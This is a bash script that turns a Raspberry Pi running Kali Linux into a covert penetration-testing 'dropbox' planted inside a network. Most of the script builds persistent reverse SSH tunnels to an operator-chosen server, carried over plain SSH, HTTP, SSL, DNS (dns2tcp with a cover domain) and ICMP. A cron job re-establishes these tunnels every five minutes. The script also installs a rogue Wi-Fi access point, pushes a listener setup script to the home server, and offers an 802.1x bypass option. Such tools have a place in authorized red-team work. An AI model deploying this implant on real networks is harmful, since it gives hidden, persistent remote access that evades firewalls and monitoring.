#!/bin/bash
#-Metadata----------------------------------------------------#
#  Filename: raspi-config.sh             (Update: 2016-02-26) #
#-Info--------------------------------------------------------#
#  Raspberry Pi Kali dropbox automated script v2              #
#-Author(s)---------------------------------------------------#
#  jbarcia                                                    #
#-Operating System--------------------------------------------#
#  Designed for: Raspberry Pi 2 - Kali Linux 2 [ARM]          #
#     Tested on: Raspberry Pi 2 - Kali Linux 2 [ARM]          #
#-Licence-----------------------------------------------------#
#  MIT License ~ http://opensource.org/licenses/MIT           #
#-Notes-------------------------------------------------------#
#  Run as root, just after a fresh/clean install of Kali 2.0. #
#                             ---                             #
#  Command line arguments:                                    #
#   --base    = Base configuration hostname/password/ssh keys #
#   --tft     = Installs and configures TFT patched kernel    #
#   --expand  = Expands Image size to fill SD card            #
#   --wifi    = Configure wifi AP to start on boot            #
#   --ssh     = Configure ssh phone home over 				  #
#					ssh/http/https/DNS                     	  #
#   --stealth = 802.1x Bypass and Stealth (includes wifi)     #
#   --reset   = Reset device                                  #
#   e.g. # bash raspi-config.sh --ssh --wifi                  #
#                             ---                             #
#                                                             #
# Blog Posts:                                                 #
#   https://www.offensive-security.com/kali-linux/            #
#                 raspberry-pi-luks-disk-encryption/          #
#                                                             #
# Image Location:                                             #
#   https://www.offensive-security.com/                       #
#                 kali-linux-vmware-arm-image-download/       #
#                                                             #
# unxz file.tar.xz                                            #
# tar xf archive.tar.xz                                       #
#                                                             #
# dd if=/root/kali-1.1.0-rpi.img of=/dev/sdb bs=4M            #
# gparted - resize partition                                  #
#                                                             #
#-------------------------------------------------------------#


##### Variables
ReverseSSHPivotPort=10022
HTTPSSHPivotPort=10080
HTTPSSSHPivotPort=10443
DNSSSHPivotPort=10053
ICMPSSHPivotPort=10000
SSHPort=22
HTTPPort=80
HTTPSPort=443
DNSPort=53

##### Optional steps
BaseConfig=false             # Do not config base                            [ --base ]
TFTinstall=false             # Do not install TFT patched kernel             [ --tft ]
Expand=false                 # Do not expand image to fill SD card           [ --expand ]
ConfigSSH=false				 # Do not config SSH 							 [ --ssh ]
ConfigWifi=false			 # Do not config Wifi 							 [ --wifi ]
Stealth=false                # Do not config stealth mode                    [ --stealth ]
ResetDevice=false            # Do not reset device                           [ --reset ]

##### (Cosmetic) Colour output
RED="\033[01;31m"      # Issues/Errors
GREEN="\033[01;32m"    # Success
YELLOW="\033[01;33m"   # Warnings/Information
BLUE="\033[01;34m"     # Heading
BOLD="\033[01;01m"     # Highlight
RESET="\033[00m"       # Normal

#-Arguments------------------------------------------------------------#

##### Read command line arguments
for x in $( tr '[:upper:]' '[:lower:]' <<< "$@" ); do
  if [ "${x}" == "--tft" ]; then
    TFTinstall=true
  elif [ "${x}" == "--expand" ]; then
    Expand=true
  elif [ "${x}" == "--base" ]; then
    BaseConfig=true
  elif [ "${x}" == "--ssh" ]; then
    ConfigSSH=true
  elif [ "${x}" == "--wifi" ]; then
    ConfigWifi=true
  elif [ "${x}" == "--stealth" ]; then
    ConfigWifi=true
    Stealth=true
  elif [ "${x}" == "--reset" ]; then
    ResetDevice=true
  else
    echo -e ' '${RED}'[!]'${RESET}" Unknown option: ${RED}${x}${RESET}" 1>&2
    exit 1
  fi
done



#-Start----------------------------------------------------------------#

echo -e "\n ${BLUE}[USAGE:]${RESET} raspi-config.sh ${BLUE}--base --tft --wifi --ssh --wifi --stealth --reset ${RESET}"
echo -e
##### Install TFT patched kernel
if [ "${TFTinstall}" != "false" ]; then
	if [ ! -f /root/tft ]; then
		echo -e "\n ${GREEN}[+]${RESET} Installing ${GREEN}Adafruit TFT Screen${RESET} ~ touch screen patched kernel"
		echo foo > /root/tft
		mount /dev/mmcblk0p1 /boot
		wget http://adafruit-download.s3.amazonaws.com/adafruit_pitft_kernel_1.20150420-1.tar.gz
		tar xf adafruit_pitft_kernel_1.20150420-1.tar.gz
		cd adafruit_pitft_kernel_1.20150420-1
		./install.sh
		echo -e "\n ${YELLOW}[i]${RESET} Installed ${YELLOW}TFT Screen Kernel${RESET}."
		echo -e "\n ${BOLD}Press ANY KEY to reboot for changes to take effect. Restart the script after reboot to continue.${RESET}"
		read -p ""
		reboot
	fi
fi

#Config TFT
if [ -f /root/tft ]; then
	echo -e "\n ${GREEN}[+]${RESET} Configuring ${GREEN}TFT Screen ${RESET}(HINT: Y/N)"
	git clone https://github.com/adafruit/Adafruit-PiTFT-Helper.git
	mount /dev/mmcblk0p1 /boot
	cd Adafruit-PiTFT-Helper
	./adafruit-pitft-helper -u /root/ -t 28r
	rm /root/tft
fi


##### Expand Raspberry Pi base image
# Currently Not Working
#if [ "${Expand}" != "false" ]; then
#	echo -e "\n ${GREEN}[+]${RESET} Expanding Raspberry Pi base image"
#	wget https://raw.github.com/dweeber/rpiwiggle/master/rpi-wiggle
#	chmod +x rpi-wiggle
#	./rpi-wiggle
#fi


##### Configuring base pi
if [ "${BaseConfig}" != "false" ]; then
echo -e "\n ${GREEN}[+]${RESET} Configuring ${GREEN}Raspberry Pi${RESET} ~ Hostname, password, and SSH keys"
echo -e "\n ${YELLOW}[i]${RESET} Enter a hostname for the pi:"
read piname
hostname "$piname"
cat /etc/hosts | sed s/"kali"/"$piname"/ > /tmp/newhosts
mv /tmp/newhosts /etc/hosts
cat /etc/hostname | sed s/"kali"/"$piname"/ > /tmp/newhostname
mv /tmp/newhostname /etc/hostname
echo -e "\n ${YELLOW}[i]${RESET} Changing root password:"
passwd
echo -e "\n ${YELLOW}[i]${RESET} Changing default SSH keys:"
update-rc.d -f ssh remove
update-rc.d -f ssh defaults
dpkg-reconfigure openssh-server

##### Change to text based
echo -e "\n ${GREEN}[+]${RESET} Changing ${GREEN}Raspberry Pi${RESET} to text-based"
#systemctl get-default
#systemctl set-default graphical.target
systemctl set-default multi-user.target

##### Update Raspberry Pi
echo -e "\n ${GREEN}[+]${RESET} Updating ${GREEN}Raspberry Pi${RESET}"
apt-get update && apt-get install kali-linux-full && apt-get -y upgrade && apt-get -y dist-upgrade
apt-get install -y screen tmux hostapd dnsmasq wireless-tools iw wvdial resolvconf bridge-utils ebtables iptables arptables isc-dhcp-server autossh httptunnel python-crypto python python-impacket python-pcapy libpcap0.8 macchanger git openssh-server

##### Installing Impacket
cd ~
git clone https://github.com/c0d3z3r0/impacket.git
cd impacket/ && python setup.py install
cd ~

##### Setting up Networking
# Removing Network Manager
#sed -i 's/managed=false/managed=true/g' /etc/NetworkManager/NetworkManager.conf
systemctl stop NetworkManager.service
systemctl disable NetworkManager.service
/etc/init.d/network-manager stop
update-rc.d network-manager remove

cat <<EOF >> "/etc/dhcp/dhclient.conf"

prepend domain-name-servers 8.8.8.8, 8.8.4.4;

EOF

#cat <<EOF >> "etc/network/interfaces"
#auto eth1
#auto eth2
#EOF

for i in `seq 0 2`; do ifconfig eth$i up && dhclient eth$i; done

fi


##### Wifi AP Auto Run
if [ "${ConfigWifi}" != "false" ]; then
	echo -e "\n ${GREEN}[+]${RESET} Configuring WIFI AP auto run"

	echo -e "\n ${YELLOW}[i]${RESET} Enter the SSID:"
	read BSSID
	echo -e "\n ${YELLOW}[i]${RESET} Enter the passphrase:"
	read PASSPH

##### Backup default config files
cp /etc/hostapd/hostapd.conf /etc/hostapd/hostapd.conf.orig
cp /etc/dnsmasq.conf /etc/dnsmasq.conf.orig

#Block Wifi Device From Network Manager
#Grab MAC
MACADDR=$( ifconfig wlan0 |grep HWaddr |cut -d' ' -f10 )
cat <<EOF >> "/etc/NetworkManager/NetworkManager.conf"

[keyfile]
unmanaged-devices=mac:$MACADDR
EOF

#Config AP
cat <<EOF > "/etc/hostapd/hostapd.conf"
interface=wlan0
driver=nl80211
ssid=$BSSID
hw_mode=g
channel=11
wpa=2
wpa_passphrase=$PASSPH
wpa_key_mgmt=WPA-PSK
wpa_ptk_rekey=600
wpa_pairwise=TKIP
rsn_pairwise=CCMP
EOF
# Config DHCP
cat <<EOF > "/etc/dnsmasq.conf"
log-facility=/var/log/dnsmasq.log
address=/#/10.0.0.1
interface=wlan0
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
no-resolv
log-queries
EOF

cat <<EOF > "/root/config_ap.sh"
#Start AP
sleep 30
#service network-manager stop
nmcli nm wifi off
nmcli radio wifi off
rfkill unblock wlan

ifconfig wlan0 10.0.0.1 up
sleep 1m
dnsmasq -C /etc/dnsmasq.conf
hostapd -B /etc/hostapd/hostapd.conf

EOF

##### Make Executable
chmod 755 /root/config_ap.sh

sed -i 's/exit 0//g' /etc/rc.local
sed -i 's/for i in `seq 0 2`; do ifconfig eth$i up && dhclient eth$i; done//g' /etc/rc.local
sed -i 's/sh \/root\/config_ap.sh &//g' /etc/rc.local
sed -i 's/ifconfig wwan0 up && dhclient wwan0//g' /etc/rc.local

cat <<EOF >> "/etc/rc.local"
sleep 30
for i in \`seq 0 2\`; do ifconfig eth\$i up && dhclient eth\$i; done
ifconfig wwan0 up && dhclient wwan0

sh /root/config_ap.sh &
exit 0
EOF

fi


##### SSH Auto Run
if [ "${ConfigSSH}" != "false" ]; then
echo -e "\n ${GREEN}[+]${RESET} Configuring SSH auto run"

echo -e "\n ${YELLOW}[i]${RESET} Call Home Over 3G/4G? (Y/N)"
read cellhome
echo -e "\n ${YELLOW}[i]${RESET} Enter server name/IP to phone home to:"
read SERVER
echo -e "\n ${YELLOW}[i]${RESET} Enter the username for the home box:"
read SERVUSR
echo -e "\n ${GREEN}[+]${RESET} Reverse-SSH Pivot port:${ReverseSSHPivotPort}"
echo -e "\n ${GREEN}[+]${RESET} HTTP-SSH Pivot port:${HTTPSSHPivotPort}"
echo -e "\n ${GREEN}[+]${RESET} HTTPS-SSH Pivot port:${HTTPSSSHPivotPort}"
echo -e "\n ${GREEN}[+]${RESET} DNS-SSH Pivot port:${DNSSSHPivotPort}"
echo -e "\n ${GREEN}[+]${RESET} ICMP-SSH Pivot port:${ICMPSSHPivotPort}"
#read PIVPORT

##### Generate SSH Keys and add to authorized keys on main server
echo -e "\n ${YELLOW}[i]${RESET} Generate new SSH key? (Y/N):"
read KEYGEN
if [[ $KEYGEN == Y* ]] || [[ $KEYGEN == y* ]]; then ssh-keygen -t rsa; fi
cat ~/.ssh/id_rsa.pub | ssh $SERVUSR@$SERVER "cat - >> ~/.ssh/authorized_keys"

cat <<EOF > "/root/server_autoconfig.sh"

#!/bin/bash
#-Metadata----------------------------------------------------#
#  Filename: server_autoconfig.sh        (Update: 2016-02-26) #
#-Info--------------------------------------------------------#
#  Raspberry Pi Kali dropbox automated server script v1       #
#-Author(s)---------------------------------------------------#
#  jbarcia                                                    #
#-Operating System--------------------------------------------#
#  Designed for: Raspberry Pi 2 - Kali Linux 2 [ARM]          #
#     Tested on: Raspberry Pi 2 - Kali Linux 2 [ARM]          #
#-Licence-----------------------------------------------------#
#  MIT License ~ http://opensource.org/licenses/MIT           #
#-Notes-------------------------------------------------------#
#  Run as root                                                #
#  Script to perform Server Multi Handler setup               #
# ------------------------------------------------------------#

 if [ "$1" == "-h" ]; then
        echo "Configures and starts all Reverse SSH Receiver tunnel listeners."
        exit 0
fi
if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root" 1>&2
   exit 1
fi
# Generate SSH server keypair if needed
files=$(ls /etc/ssh/*_key 2> /dev/null | wc -l)
if [ "$files" != "0" ]; then
        echo "[-] SSHd server keys already exist. Skipping generation..."
 else
        echo "[+] Generating SSHd server keys..."
        sshd-generate
fi
# Kill any active tunnel connections & listeners
for i in `netstat -lntup |grep rasppi |awk '{print$7}' |awk -F"/" '{print$1}'`; do kill $i ; done
killall ptunnel
killall stunnel
killall dns2tcpd
killall hts
# Start/restart Backtrack SSH server
echo "[+] Restarting SSHD..." /etc/init.d/ssh restart
# Create rasppi user account if needed
cut -d: -f1 /etc/passwd | grep "rasppi" > /dev/null
OUT=$?
if [ $OUT -eq 0 ];then
        echo "[-] User 'rasppi' already exists. Skipping." else
        echo "[+] Adding 'rasppi' user account..."
        useradd -m rasppi
fi
# Make rasppi user .ssh directory if needed
if [ ! -d "/home/rasppi/.ssh" ]; then
        mkdir -p /home/rasppi/.ssh
fi
# Copy rasppi user SSH public key to authorized_keys
#echo "$rasppi_user_ssh_key" > /home/rasppi/.ssh/authorized_keys
# Configure & start Reverse-SSH-over-HTTP listener
if [ -e "/usr/bin/hts" ]; then
        echo "[-] HTTPTunnel is already installed."
        echo "[+] Starting Reverse-SSH-over-HTTP (HTTPtunnel) listener..."
        hts -F 0.0.0.0:22 80 & else
        echo "[+] Installing HTTPtunnel via apt..."
        apt-get --force-yes --yes -qq install httptunnel
        echo "[+] Starting Reverse-SSH-over-HTTP (HTTPtunnel) listener..."
        hts -F 0.0.0.0:22 80 &
fi
# Configure & start Reverse-SSH-over-SSL listener
if [ -d "/root/stunnel/" ]; then
        echo "[-] stunnel is already configured. Remove directory /root/stunnel/ and re-run this script if you want to reconfigure."
        echo "[+] Starting Reverse-SSH-over-SSL (stunnel) listener..."
        stunnel /root/stunnel/stunnel.conf & else
        echo "[+] Configuring stunnel..."
        echo "[+] Generating SSL certificate (press enter for all prompts)..."
        #DIR='pwd'
        mkdir /root/stunnel/ && cd /root/stunnel/
        openssl genrsa -out pwn_key.pem 2048
        openssl req -new -key pwn_key.pem -out pwn.csr
        openssl x509 -req -in pwn.csr -out pwn_cert.pem -signkey pwn_key.pem -days 1825
        cat pwn_cert.pem >> pwn_key.pem
        #cd $DIR
        echo "[+] SSL certificate created. Configuring stunnel.conf..."
        echo -e "cert = /root/stunnel/pwn_key.pem\nchroot = /var/tmp/stunnel\npid = /stunnel.pid\nsetuid = root\nsetgid = root\nclient = no\n[22]\naccept = 443\nconnect = 22" >> /root/stunnel/stunnel.conf
        mkdir /var/tmp/stunnel
        echo "[+] Starting Reverse-SSH-over-SSL (stunnel) listener..."
        /usr/bin/stunnel /root/stunnel/stunnel.conf &
fi
# Configure & start Reverse-SSH-over-DNS listener
if [ -e /root/dns2tcpdrc ]; then
        echo "[-] DNS2TCP is already configured. Remove /root/dns2tcpdrc and re-run this script if you want to reconfigure."
        echo "[+] Starting Reverse-SSH-over-DNS (dns2tcp) listener..."
        /usr/bin/dns2tcpd -d 0 -f /root/dns2tcpdrc &
else
        echo "[+] Configuring DNS2TCP..."
        echo -e "listen = 0.0.0.0\nport = 53\nuser = nobody\nchroot = /var/empty/dns2tcp/\ndomain = rssfeeds.com\nresources = ssh:127.0.0.1:22" >> /root/dns2tcpdrc
        mkdir -p /var/empty/dns2tcp/
        echo "[+] Starting Reverse-SSH-over-DNS (dns2tcp) listener..."
        /usr/bin/dns2tcpd -d 0 -f /root/dns2tcpdrc &
fi
# Start Reverse-SSH-over-ICMP listener
        echo "[+] Starting Reverse-SSH-over-ICMP (ptunnel) listener (Logging to /tmp/ptunnel.log)..."
        /usr/sbin/ptunnel -daemon /tmp/ptunnel -f /tmp/ptunnel.log & echo "" 
        echo "[+] Setup Complete." 
        echo "[+] Press ENTER to listen for incoming connections..." 
        read INPUT 
        watch -d "netstat -lntup4 | grep 'pwn' | grep 333"

EOF

cat /root/server_autoconfig.sh | ssh $SERVUSR@$SERVER "cat - >> ~/server_autoconfig.sh"

		
##### Create revssh script
cat <<EOF > "/root/revssh.sh"
#!/bin/sh
# $REMOTE_HOST is the name of the remote system
REMOTE_HOST=$SERVER
 
# Setting username for home box
USER_NAME=$SERVUSR
SSH_Port=$SSHPort

# $PIVOT_PORT is the remote port number that will be used to tunnel
# back to this system
PIVOT_PORT=${ReverseSSHPivotPort} 

EOF
cat <<\EOF >> "/root/revssh.sh"

Tunnel_status=`ps -C ssh -o pid,args |grep -o "${PIVOT_PORT}:localhost:22"`
AUTOSSH_PID=`ps -C autossh -o pid,args |grep "autossh -2NR ${PIVOT_PORT}" |awk '{print$1}'`
SSH_ChildProcess_PID=`ps -C ssh -o pid,args |grep "${PIVOT_PORT}:localhost:22" |awk '{print$1}'`


# Set standard autossh variables
export AUTOSSH_FIRST_POLL=60
export AUTOSSH_POLL=60
export AUTOSSH_GATETIME=30
export AUTOSSH_LOGFILE=/var/log/autossh.log
export AUTOSSH_DEBUG=no
export AUTOSSH_PATH=/usr/bin/ssh

# Set tunnel-specific autossh variables
export AUTOSSH_PORT=26082
export AUTOSSH_PIDFILE=/var/run/STD_autossh.pid

# If tunnel already established, do nothing. If not, attempt connect.
if [ "${Tunnel_status}" == "${PIVOT_PORT}:localhost:22" ] ; then echo connected ; \
else \
kill ${AUTOSSH_PID}; \
kill ${SSH_ChildProcess_PID}; \
sleep 1
autossh -2NR ${PIVOT_PORT}:localhost:22 "${USER_NAME}"@"${REMOTE_HOST}" -p ${SSH_Port}; \
fi
EOF
	


##### Create httpssh script
cat <<EOF > "/root/httpssh.sh"
#!/bin/sh

# Get user variables from script_configs
#Proxy_enable=
#Proxy_address=
#Proxy_port=
#Proxy_auth_user=
#Proxy_auth_password=

# $REMOTE_HOST is the name of the remote system
REMOTE_HOST=$SERVER
 
# Setting username for home box
USER_NAME=$SERVUSR
 
# $PIVOT_PORT is the remote port number that will be used to tunnel
# back to this system
PIVOT_PORT=${HTTPSSHPivotPort}

# Set SSH variables
REMOTE_HOST_port=$HTTPPort

EOF
cat <<\EOF >> "/root/httpssh.sh"

Tunnel_status=`ps -C ssh -o pid,args |grep -o "${PIVOT_PORT}:localhost:22"`
AUTOSSH_PID=`ps -C autossh -o pid,args |grep "autossh -2NR ${PIVOT_PORT}" |awk '{print$1}'`
SSH_ChildProcess_PID=`ps -C ssh -o pid,args |grep "${PIVOT_PORT}:localhost:22" |awk '{print$1}'`
iptables_rule_status=`iptables -nvL |grep -o "tcp dpt:7777" |tail -n1`

# Set standard autossh variables
export AUTOSSH_FIRST_POLL=60
export AUTOSSH_POLL=60
export AUTOSSH_GATETIME=30
export AUTOSSH_LOGFILE=/var/log/autossh.log
export AUTOSSH_DEBUG=no
export AUTOSSH_PATH=/usr/bin/ssh

# Set tunnel-specific autossh variables
export AUTOSSH_PORT=26088
export AUTOSSH_PIDFILE=/var/run/HTTP_autossh.pid

# Add iptables rule if not present
if [ "${iptables_rule_status}" == "tcp dpt:7777" ] ; then echo "iptables rule present" ; \
else iptables -A INPUT -i eth0 -p tcp --dport 7777 -j DROP
fi

# If tunnel already established, do nothing. If not, attempt connect.
if [ "${Tunnel_status}" == "${PIVOT_PORT}:localhost:22" ] ; then echo connected ; \
else \
kill ${AUTOSSH_PID}; \
kill ${SSH_ChildProcess_PID}; \
killall htc ; \
sleep 1

if [ "$Proxy_enable" == "YES" ] ; then \
echo "PROXY enabled: " "$Proxy_address" "$Proxy_port" ; \
htc -P "$Proxy_address":"$Proxy_port" -A "$Proxy_auth_user":"$Proxy_auth_password" -F 7777 "$REMOTE_HOST":"$REMOTE_HOST_port" ; \
sleep 1
autossh -2NR ${PIVOT_PORT}:localhost:22 "$USER_NAME"@localhost -p 7777 ; \
fi

htc -F 7777 "$REMOTE_HOST":"$REMOTE_HOST_port" ; \
sleep 1
autossh -2NR ${PIVOT_PORT}:localhost:22 "$USER_NAME"@localhost -p 7777 ; \

fi

EOF


##### Create httpsssh script
cat <<EOF > "/root/httpsssh.sh"
#!/bin/sh
# $REMOTE_HOST is the name of the remote system
REMOTE_HOST=$SERVER
 
# Setting username for home box
USER_NAME=$SERVUSR
 
# $PIVOT_PORT is the remote port number that will be used to tunnel
# back to this system
PIVOT_PORT=${HTTPSSSHPivotPort}
 
EOF
cat <<\EOF >> "/root/httpsssh.sh"

Tunnel_status=`ps -C ssh -o pid,args |grep -o "${PIVOT_PORT}:localhost:22"`
AUTOSSH_PID=`ps -C autossh -o pid,args |grep "autossh -2NR ${PIVOT_PORT}" |awk '{print$1}'`
SSH_ChildProcess_PID=`ps -C ssh -o pid,args |grep "${PIVOT_PORT}:localhost:22" |awk '{print$1}'`

# Set standard autossh variables
export AUTOSSH_FIRST_POLL=60
export AUTOSSH_POLL=60
export AUTOSSH_GATETIME=30
export AUTOSSH_LOGFILE=/var/log/autossh.log
export AUTOSSH_DEBUG=no
export AUTOSSH_PATH=/usr/bin/ssh

# Set tunnel-specific autossh variables
export AUTOSSH_PORT=26092
export AUTOSSH_PIDFILE=/var/run/SSL_autossh.pid

# If tunnel already established, do nothing. If not, attempt connect.
if [ "${Tunnel_status}" == "${PIVOT_PORT}:localhost:22" ] ; then echo connected ; \
else \
kill ${AUTOSSH_PID}; \
kill ${SSH_ChildProcess_PID}; \
killall stunnel4 ; \
sleep 1

#stunnel -c -d 127.0.0.1:7779 -r "$REMOTE_HOST":443 ; \
stunnel /root/stunnel.conf
sleep 1
autossh -2NR ${PIVOT_PORT}:localhost:22 "$USER_NAME"@localhost -p 7779 ; \
fi

EOF

##### Create stunnel conf
cat <<EOF > "/root/stunnel.conf"
[https]
client = yes
accept = 127.0.0.1:7779
connect = ${SERVER}:${HTTPSPort}

EOF



##### Create dnsssh script
cat <<EOF > "/root/dnsssh.sh"
#!/bin/sh
# $REMOTE_HOST is the name of the remote system
REMOTE_HOST=$SERVER
 
# Setting username for home box
USER_NAME=$SERVUSR
 
# $PIVOT_PORT is the remote port number that will be used to tunnel
# back to this system
PIVOT_PORT=${DNSSSHPivotPort}
 
EOF
cat <<\EOF >> "/root/dnsssh.sh"

Tunnel_status=`ps -C ssh -o pid,args |grep -o "${PIVOT_PORT}:localhost:22"`
AUTOSSH_PID=`ps -C autossh -o pid,args |grep "autossh -2NR ${PIVOT_PORT}" |awk '{print$1}'`
SSH_ChildProcess_PID=`ps -C ssh -o pid,args |grep "${PIVOT_PORT}:localhost:22" |awk '{print$1}'`

# Set standard autossh variables
export AUTOSSH_FIRST_POLL=60
export AUTOSSH_POLL=60
export AUTOSSH_GATETIME=30
export AUTOSSH_LOGFILE=/var/log/autossh.log
export AUTOSSH_DEBUG=no
export AUTOSSH_PATH=/usr/bin/ssh

# Set tunnel-specific autossh variables
export AUTOSSH_PORT=26084
export AUTOSSH_PIDFILE=/var/run/DNS_autossh.pid

# If tunnel already established, do nothing. If not, attempt connect.
if [ "${Tunnel_status}" == "${PIVOT_PORT}:localhost:22" ] ; then echo connected ; \
else \
kill ${AUTOSSH_PID}; \
kill ${SSH_ChildProcess_PID}; \
killall dns2tcpc; \
sleep 1; \

dns2tcpc -r ssh -l 7778 -z rssfeeds.com "${REMOTE_HOST}" & \
sleep 1; \
autossh -2NR ${PIVOT_PORT}:localhost:22 "${USER_NAME}"@localhost -p 7778 ; \
fi

EOF
	

##### Create icmpssh script
cat <<EOF > "/root/icmpssh.sh"
#!/bin/sh
# $REMOTE_HOST is the name of the remote system
REMOTE_HOST=$SERVER
 
# Setting username for home box
USER_NAME=$SERVUSR
 
# $PIVOT_PORT is the remote port number that will be used to tunnel
# back to this system
PIVOT_PORT=${ICMPSSHPivotPort}
 
EOF
cat <<\EOF >> "/root/icmpssh.sh"

Tunnel_status=`ps -C ssh -o pid,args |grep -o "${PIVOT_PORT}:localhost:22"`
AUTOSSH_PID=`ps -C autossh -o pid,args |grep "autossh -2NR ${PIVOT_PORT}" |awk '{print$1}'`
SSH_ChildProcess_PID=`ps -C ssh -o pid,args |grep "${PIVOT_PORT}:localhost:22" |awk '{print$1}'`
iptables_rule_status=`iptables -nvL |grep -o "tcp dpt:7776" |tail -n1`

# Set standard autossh variables
export AUTOSSH_FIRST_POLL=60
export AUTOSSH_POLL=60
export AUTOSSH_GATETIME=30
export AUTOSSH_LOGFILE=/var/log/autossh.log
export AUTOSSH_DEBUG=no
export AUTOSSH_PATH=/usr/bin/ssh

# Set tunnel-specific autossh variables
export AUTOSSH_PORT=26090
export AUTOSSH_PIDFILE=/var/run/ICMP_autossh.pid

# Add iptables rule if not present
if [ "${iptables_rule_status}" == "tcp dpt:7776" ] ; then echo "iptables rule present" ; \
else iptables -A INPUT -i eth0 -p tcp --dport 7776 -j DROP
fi

# If tunnel already established, do nothing. If not, attempt connect.
if [ "${Tunnel_status}" == "${PIVOT_PORT}:localhost:22" ] ; then echo connected ; \
else \
kill ${AUTOSSH_PID}; \
kill ${SSH_ChildProcess_PID}; \
killall ptunnel ; \
sleep 1

ptunnel -lp 7776 -p "$REMOTE_HOST" -da "$REMOTE_HOST" -dp 22 -c eth0 & \
sleep 1
autossh -2NR ${PIVOT_PORT}:localhost:22 "$USER_NAME"@localhost -p 7776 ; \
fi

EOF


##### Make Executable
chmod 755 /root/revssh.sh
chmod 755 /root/httpssh.sh
chmod 755 /root/httpsssh.sh
chmod 755 /root/dnsssh.sh
chmod 755 /root/icmpssh.sh


sed -i 's/exit 0//g' /etc/rc.local
sed -i 's/sleep 30//g' /etc/rc.local
sed -i 's/for i in `seq 0 2`; do ifconfig eth$i up && dhclient eth$i; done//g' /etc/rc.local
sed -i 's/ifconfig wwan0 up && dhclient wwan0//g' /etc/rc.local

cat <<EOF >> "/etc/rc.local"
sleep 30
for i in \`seq 0 2\`; do ifconfig eth\$i up && dhclient eth\$i; done
ifconfig wwan0 up && dhclient wwan0

exit 0
EOF

##### Route over WWAN 3/4G?
if [[ $cellhome == Y* ]] || [[ $cellhome == y* ]]; then

echo 200 LAN1 >> /etc/iproute2/rt_tables
echo 201 LAN2 >> /etc/iproute2/rt_tables
echo 300 WAN >> /etc/iproute2/rt_tables

sed -i 's/exit 0//g' /etc/rc.local

cat <<EOF >> "/etc/rc.local"
IPADDRETH1=\$( ifconfig eth1|grep 'inet addr' |cut -d' ' -f12 |cut -d: -f2 )
MASKETH1=\$( ifconfig eth1|grep 'Mask' |cut -d' ' -f16 |cut -d: -f2 )
if [ \$MASKETH1 == 255.255.255.0 ]; then BROADETH1=\$( echo \$IPADDRETH1 |cut -d. -f1,2,3 ).0/24 && GATEETH1=\$( echo \$IPADDRETH1 |cut -d. -f1,2,3 ).1; fi
if [ \$MASKETH1 == 255.255.0.0 ]; then BROADETH1=\$( echo \$IPADDRETH1 |cut -d. -f1,2,3 ).0/16  && GATEETH1=\$( echo \$IPADDRETH1 |cut -d. -f1,2 ).0.1; fi
if [ \$MASKETH1 == 255.0.0.0 ]; then BROADETH1=\$( echo \$IPADDRETH1 |cut -d. -f1,2,3 ).0/8  && GATEETH1=\$( echo \$IPADDRETH1 |cut -d. -f1 ).0.0.1; fi

IPADDRETH2=\$( ifconfig eth2|grep 'inet addr' |cut -d' ' -f12 |cut -d: -f2 )
MASKETH2=\$( ifconfig eth2|grep 'Mask' |cut -d' ' -f16 |cut -d: -f2 )
if [ \$MASKETH2 == 255.255.255.0 ]; then BROADETH2=\$( echo \$IPADDRETH2 |cut -d. -f1,2,3 ).0/24 && GATEETH2=\$( echo \$IPADDRETH2 |cut -d. -f1,2,3 ).1; fi
if [ \$MASKETH2 == 255.255.0.0 ]; then BROADETH2=\$( echo \$IPADDRETH2 |cut -d. -f1,2,3 ).0/16 && GATEETH2=\$( echo \$IPADDRETH2 |cut -d. -f1,2 ).0.1; fi
if [ \$MASKETH2 == 255.0.0.0 ]; then BROADETH2=\$( echo \$IPADDRETH2 |cut -d. -f1,2,3 ).0/8 && GATEETH2=\$( echo \$IPADDRETH2 |cut -d. -f1 ).0.0.1; fi

IPADDRWAN=\$( ifconfig wwan0|grep 'inet addr' |cut -d' ' -f12 |cut -d: -f2 )
MASKWAN=\$( ifconfig wwan0|grep 'Mask' |cut -d' ' -f16 |cut -d: -f2 )
if [ \$MASKWAN == 255.255.255.0 ]; then BROADWAN=\$( echo \$IPADDRWAN |cut -d. -f1,2,3 ).0/24 && GATEWAN=\$( echo $IPADDRWAN |cut -d. -f1,2,3 ).1; fi
if [ \$MASKWAN == 255.255.0.0 ]; then BROADWAN=\$( echo \$IPADDRWAN |cut -d. -f1,2,3 ).0/16 && GATEWAN=\$( echo $IPADDRWAN |cut -d. -f1,2 ).0.1; fi
if [ \$MASKWAN == 255.0.0.0 ]; then BROADWAN=\$( echo \$IPADDRWAN |cut -d. -f1,2,3 ).0/8 && GATEWAN=\$( echo $IPADDRWAN |cut -d. -f1 ).0.0.1; fi

ip route add \$MASKETH1 dev eth1 src \$IPADDRETH1 table LAN1
ip route add \$MASKETH2 dev eth2 src \$IPADDRETH2 table LAN2
ip route add \$MASKWAN dev wwan0 src \$IPADDRWAN table WAN

ip route add default via \$GATEETH1 dev eth1 table LAN1
ip route add default via \$GATEETH2 dev eth2 table LAN2
ip route add default via \$GATEWAN dev wwan0 table WAN

# ip rule add from 10.200.6.55/32 table eth1
# ip rule add to 10.200.6.55/32 table eth1

route add -host $SERVER dev wwan0
# 
# sh /root/revssh.sh &
# sh /root/httpssh.sh &
# sh /root/httpsssh.sh &
# sh /root/dnsssh.sh &
# sh /root/icmpssh.sh &

exit 0
EOF
fi

# ln -s /root/revssh.sh /etc/rc2.d/S99revssh.sh
# ln -s /root/httpssh.sh /etc/rc2.d/S99httpssh.sh
# ln -s /root/httpsssh.sh /etc/rc2.d/S99httpsssh.sh
# ln -s /root/dnsssh.sh /etc/rc2.d/S99dnsssh.sh
# ln -s /root/icmpssh.sh /etc/rc2.d/S99icmpssh.sh

##### Configure cron job to call home every 5 min
cat <<EOF > "/etc/cron.d/revssh"
*/5 * * * * root bash /root/revssh.sh&
*/5 * * * * root bash /root/httpssh.sh&
*/5 * * * * root bash /root/httpsssh.sh&
*/5 * * * * root bash /root/dnsssh.sh&
*/5 * * * * root bash /root/icmpssh.sh&
EOF

##### DONE
echo -e "\n ${GREEN}[+] From The Main Server:${RESET}   ssh -D 1080 -p $PIVPORT pi@localhost"
echo -e "\n ${GREEN}[+] From The Main Server:${RESET}   ssh -D 1080 -p $ReverseSSHPivotPort pi@localhost"
echo -e "\n ${GREEN}[+] From The Main Server:${RESET}   ssh -D 1080 -p $HTTPSSHPivotPort pi@localhost"
